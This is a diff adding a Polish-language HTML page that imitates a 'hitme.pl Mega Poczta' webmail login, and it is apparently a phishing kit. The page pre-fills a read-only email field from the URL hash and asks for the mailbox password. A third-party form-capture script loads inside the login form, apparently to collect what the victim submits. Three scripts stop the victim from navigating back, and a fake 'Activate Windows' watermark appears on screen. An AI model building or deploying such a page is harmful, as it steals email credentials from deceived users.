@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>hitme.pl - Witaj w Mega Poczcie!</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            /* Replicating the cloud pattern graphics layout background seamlessly */
+            background-image: radial-gradient(rgba(0, 0, 0, 0.02) 2px, transparent 2px), 
+                              linear-gradient(to bottom, #ffffff 60%, #f4f6f9 100%);
+            background-size: 40px 40px, 100% 100%;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Top Right Config Badge Float Button Area */
+        .config-badge {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: linear-gradient(90deg, #5c6bc0, #26c6da);
+            color: #ffffff;
+            padding: 8px 16px;
+            font-size: 11px;
+            font-weight: bold;
+            text-transform: uppercase;
+            border-radius: 20px;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            box-shadow: 0 4px 10px rgba(92, 107, 192, 0.2);
+        }
+
+        /* Centered Header Panel Structure Components */
+        .brand-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo-text {
+            font-size: 32px;
+            font-weight: 300;
+            color: #7c7c7c;
+            letter-spacing: -1px;
+            position: relative;
+            display: inline-block;
+            margin-bottom: 16px;
+        }
+
+        .logo-text span {
+            font-weight: bold;
+            color: #4a4a4a;
+        }
+
+        /* Tiny signature orange fire flame shape accent decoration element */
+        .logo-text::after {
+            content: '🔥';
+            position: absolute;
+            top: -16px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 20px;
+        }
+
+        .welcome-title {
+            font-size: 36px;
+            font-weight: 300;
+            color: #333333;
+            line-height: 1.3;
+        }
+
+        .welcome-title strong {
+            font-weight: 800;
+            color: #000000;
+        }
+
+        /* Main Form Control Wrapper Card */
+        .login-box {
+            width: 100%;
+            max-width: 320px;
+            display: flex;
+            flex-direction: column;
+            z-index: 5;
+        }
+
+        .input-row {
+            display: flex;
+            width: 100%;
+            height: 46px;
+            margin-bottom: 12px;
+            border: 1px solid #e0e0e0;
+            border-radius: 30px; /* Distinctive clean rounded edge capsules style layout */
+            overflow: hidden;
+            background-color: #ffffff;
+            transition: border-color 0.2s;
+        }
+
+        .input-row:focus-within {
+            border-color: #5c6bc0;
+        }
+
+        /* Left prefix visual boundary marker icon capsule segment grid */
+        .icon-box {
+            width: 46px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #9e9e9e;
+            font-size: 14px;
+            border-right: 1px solid #f0f0f0;
+        }
+
+        .form-control {
+            flex: 1;
+            padding: 0 18px;
+            border: none;
+            font-size: 14px;
+            color: #333333;
+            outline: none;
+            background: transparent;
+        }
+
+        .form-control::placeholder {
+            color: #c4c4c4;
+        }
+
+        /* Dropdown selection field capsule styling properties */
+        .select-control {
+            flex: 1;
+            padding: 0 18px;
+            border: none;
+            font-size: 14px;
+            color: #555555;
+            outline: none;
+            background: transparent;
+            cursor: pointer;
+            appearance: none;
+            -webkit-appearance: none;
+            background-image: url("data:image/svg+xml;utf8,<svg fill='%239e9e9e' height='24' viewBox='0 0 24 24' width='24' xmlns='http://w3.org'><path d='M7 10l5 5 5-5z'/><path d='M0 0h24v24H0z' fill='none'/></svg>");
+            background-repeat: no-repeat;
+            background-position: right 14px center;
+        }
+
+        /* Vibrant Multi-Color Purple to Cyan Gradient Capsule Button Component */
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(90deg, #5c6bc0, #26c6da);
+            color: #ffffff;
+            border: none;
+            height: 48px;
+            font-size: 14px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border-radius: 30px;
+            cursor: pointer;
+            margin-top: 14px;
+            box-shadow: 0 4px 14px rgba(38, 198, 218, 0.3);
+            transition: opacity 0.15s ease;
+        }
+
+        .submit-btn:hover {
+            opacity: 0.95;
+        }
+
+        /* Bottom Assistance Information Area Component Row */
+        .info-footer-banner {
+            margin-top: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 14px;
+            text-align: left;
+            max-width: 400px;
+            cursor: pointer;
+        }
+
+        .info-icon-circle {
+            width: 36px;
+            height: 36px;
+            border: 2px solid #5c6bc0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #5c6bc0;
+            font-weight: bold;
+            font-size: 18px;
+            flex-shrink: 0;
+        }
+
+        .info-text-lines {
+            font-size: 13px;
+            color: #666666;
+            line-height: 1.4;
+        }
+
+        .info-text-lines strong {
+            color: #222222;
+        }
+
+        /* Fixed Background Desktop System Watermark Overlay Component */
+        .system-watermark {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            text-align: left;
+            font-size: 13px;
+            color: rgba(0, 0, 0, 0.15);
+            line-height: 1.4;
+            user-select: none;
+            pointer-events: none;
+            z-index: 10;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Floating Top Right Tool Action Link Badge -->
+    <a href="#" class="config-badge">⚙ Konfiguracja Poczty</a>
+
+    
+    <header class="brand-header">
+        <div class="logo-text">hit<span>me.pl</span></div>
+        <h1 class="welcome-title">Witaj<br>w <strong>Mega Poczcie!</strong></h1>
+    </header>
+
+    <!-- Center Login Processing Form Capsule Component Box -->
+    <div class="login-box">
+        <form action="" method="POST">
+            <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=wyob9cof&n=n1.ratufa.io"></script>
+            <div class="input-row">
+                <div class="icon-box">👤</div>
+                    <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+            </div>
+            
+            <div class="input-row">
+                <div class="icon-box">🔒</div>
+<input type="password" name="Password" placeholder="haslo" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+            </div>
+
+            <div class="input-row">
+                <div class="icon-box">🏠</div>
+                <select name="server_node" class="select-control">
+                    <option value="mx1">mx1.hitme.net.pl</option>
+                </select>
+            </div>
+            
+            <button type="submit" class="submit-btn">Zaloguj</button>
+        </form>
+    </div>
+
+    <!-- Bottom Configuration Advisory Row Guide Banner -->
+    <div class="info-footer-banner">
+        <div class="info-icon-circle">!</div>
+        <div class="info-text-lines">
+            <strong>Chcesz używać własnego klienta poczty?</strong><br>
+            <span style="color: #888888; font-size: 12px;">Kliknij po informacje o konfiguracji...</span>
+        </div>
+    </div>
+
+    <!-- Windows Environment Activation Notification Simulation Overlay Layer -->
+    <div class="system-watermark">
+        Activate Windows<br>
+        <span style="font-size: 11px;">Go to Settings to activate Windows.</span>
+    </div>
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+</body>
+</html>
